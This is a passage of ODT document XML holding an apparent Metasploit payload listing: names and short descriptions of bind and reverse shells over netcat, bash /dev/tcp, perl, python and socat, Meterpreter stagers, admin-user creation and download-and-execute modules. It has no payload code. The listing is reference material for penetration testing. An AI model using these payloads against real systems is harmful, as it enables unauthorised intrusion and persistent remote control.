      <text:p text:style-name="P1"><text:s text:c="37"/>his can be used as a template f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or other JCL based payloads</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/mainframe/reverse_shell_jcl <text:s/>Provide JCL which creates a rev</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>erse shell This implementation</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>does not include ebcdic charact</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er translation, so a client wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h translation capabilities is r</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>equired. MSF handles this autom</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>atically.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/adduser <text:s text:c="16"/>Creates a new user. By default</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the new user is set with sudo b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ut other options exist to make</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>the new user automatically root</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>but this is not automatically</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>set since the new user will be</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>treated as root (and login may</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>be difficult). The new user can</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>also be set as just a standard</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>user if desired.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_awk <text:s text:c="15"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via GNU AWK</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_aws_instance_conn <text:s/>Creates an SSH shell using AWS</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ect <text:s text:c="29"/>Instance Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_busybox_telnetd <text:s text:c="3"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via BusyBox</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>telnetd</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_inetd <text:s text:c="13"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell (persistent)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_jjs <text:s text:c="15"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via jjs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_lua <text:s text:c="15"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via Lua</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_netcat <text:s text:c="12"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via netcat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_netcat_gaping <text:s text:c="5"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via netcat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_netcat_gaping_ipv <text:s/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>6 <text:s text:c="31"/>wn a command shell via netcat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_nodejs <text:s text:c="12"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via nodejs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_perl <text:s text:c="14"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via perl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_perl_ipv6 <text:s text:c="9"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via perl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_r <text:s text:c="17"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via R</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_ruby <text:s text:c="14"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via Ruby</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_ruby_ipv6 <text:s text:c="9"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via Ruby</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_socat_sctp <text:s text:c="8"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a socat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_socat_udp <text:s text:c="9"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a socat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_stub <text:s text:c="14"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell (stub only,</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>no payload)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/bind_zsh <text:s text:c="15"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via Zsh. Not</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e: Although Zsh is often availa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>ble, please be aware it isn't u</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sually installed by default.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/generic <text:s text:c="16"/>Executes the supplied command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/interact <text:s text:c="15"/>Interacts with a shell on an es</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tablished socket connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/pingback_bind <text:s text:c="10"/>Accept a connection, send a UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D, then exit</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/pingback_reverse <text:s text:c="7"/>Creates a socket, send a UUID,</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>then exit</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter/bin <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="28"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter/bin <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp_uuid <text:s text:c="23"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter/rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_http <text:s text:c="24"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Tunnel communi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation over HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter/rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_https <text:s text:c="23"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Tunnel communi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation over HTTP using SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter/rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="25"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter/rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp_ssl <text:s text:c="21"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Reverse Python</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connect back stager using SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter/rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp_uuid <text:s text:c="20"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter_bin <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="28"/>command. Connect to the victim</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>and spawn a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter_rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_http <text:s text:c="24"/>command. Connect back to the a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ttacker and spawn a Meterpreter</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shell</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/unix/python/meterpreter_rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_https <text:s text:c="23"/>command. Connect back to the a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ttacker and spawn a Meterpreter</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/meterpreter_rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="25"/>command. Connect back to the a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ttacker and spawn a Meterpreter</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/pingback_bind_t <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="31"/>command. Listens for a connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ion from the attacker, sends a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>UUID, then terminates</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/pingback_revers <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="28"/>command. Connects back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>attacker, sends a UUID, then te</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rminates</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/shell_bind_tcp <text:s text:c="2"/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with Python 2.4-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/shell_reverse_s <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ctp <text:s text:c="30"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with Python 2.6-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/shell_reverse_t <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="31"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with Python 2.4-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/shell_reverse_t <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_ssl <text:s text:c="27"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, uses SSL, e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ncodes with base64 by design. C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ompatible with Python 2.6-2.7 a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/python/shell_reverse_u <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>dp <text:s text:c="31"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with Python 2.6-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse <text:s text:c="16"/>Creates an interactive shell th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rough two inbound connections</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_awk <text:s text:c="12"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a GNU AWK</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_bash <text:s text:c="11"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a bash's builtin /dev/tcp. This</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>will not work on circa 2009 an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d older Debian-based Linux dist</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ributions (including Ubuntu) be</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cause they compile bash without</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>the /dev/tcp feature.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_bash_telnet_ss <text:s/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l <text:s text:c="31"/>a mkfifo and telnet. This metho</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d works on Debian and other sys</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tems compiled without /dev/tcp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>support. This module uses the '</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>-z' option included on some sys</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tems to encrypt using SSL.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_bash_udp <text:s text:c="7"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a bash's builtin /dev/udp. This</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>will not work on circa 2009 an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d older Debian-based Linux dist</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ributions (including Ubuntu) be</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cause they compile bash without</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the /dev/udp feature.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_jjs <text:s text:c="12"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via jjs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_ksh <text:s text:c="12"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Ksh. Note: Althoug</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h Ksh is often available, pleas</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e be aware it isn't usually ins</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>talled by default.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_lua <text:s text:c="12"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Lua</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_ncat_ssl <text:s text:c="7"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a ncat, utilizing ssl mode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_netcat <text:s text:c="9"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a netcat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_netcat_gaping <text:s text:c="2"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a netcat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_nodejs <text:s text:c="9"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via nodejs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_openssl <text:s text:c="8"/>Creates an interactive shell th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rough two inbound connections</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_perl <text:s text:c="11"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a perl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_perl_ssl <text:s text:c="7"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a perl, uses SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_php_ssl <text:s text:c="8"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a php, uses SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_python <text:s text:c="9"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Python</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_python_ssl <text:s text:c="5"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a python, uses SSL, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_r <text:s text:c="14"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via R</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_ruby <text:s text:c="11"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Ruby</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_ruby_ssl <text:s text:c="7"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Ruby, uses SSL</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/unix/reverse_socat_sctp <text:s text:c="5"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a socat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_socat_tcp <text:s text:c="6"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a socat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_socat_udp <text:s text:c="6"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a socat</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_ssh <text:s text:c="12"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via SSH</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_ssl_double_tel <text:s/>Creates an interactive shell th</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>net <text:s text:c="29"/>rough two inbound connections,</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>encrypts using SSL via "-z" opt</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_stub <text:s text:c="11"/>Creates an interactive shell th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rough an inbound connection (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ub only, no payload)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_tclsh <text:s text:c="10"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Tclsh</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/unix/reverse_zsh <text:s text:c="12"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Zsh. Note: Althoug</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h Zsh is often available, pleas</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e be aware it isn't usually ins</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>talled by default.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/adduser <text:s text:c="13"/>Create a new user and add them</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>to local administration group.</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Note: The specified password is</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>checked for common complexity</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>requirements to prevent the tar</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>get machine rejecting the user</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for failing to meet policy requ</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>irements. Complexity check: 8-1</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4 chars (1 UPPER, 1 lower, 1 di</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>git/special)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/bind_lua <text:s text:c="12"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via Lua</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/bind_perl <text:s text:c="11"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via perl (pe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rsistent)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/bind_perl_ipv6 <text:s text:c="6"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell via perl (pe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rsistent)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/bind_ruby <text:s text:c="11"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via Ruby</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/download_eval_vbs <text:s text:c="3"/>Downloads a file from an HTTP(S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>) URL and executes it as a vbs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>script. Use it to stage a vbs e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ncoded payload from a short com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand line.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/download_exec_vbs <text:s text:c="3"/>Download an EXE from an HTTP(S)</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>URL and execute it</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/generic <text:s text:c="13"/>Executes the supplied command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>d_ipv6_tcp <text:s text:c="22"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for an I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Pv6 connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_ipv6_tcp_uuid <text:s text:c="17"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for an I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Pv6 connection with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_named_pipe <text:s text:c="20"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a pi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pe connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="27"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/http/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp_rc4 <text:s text:c="23"/>d from an http server. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
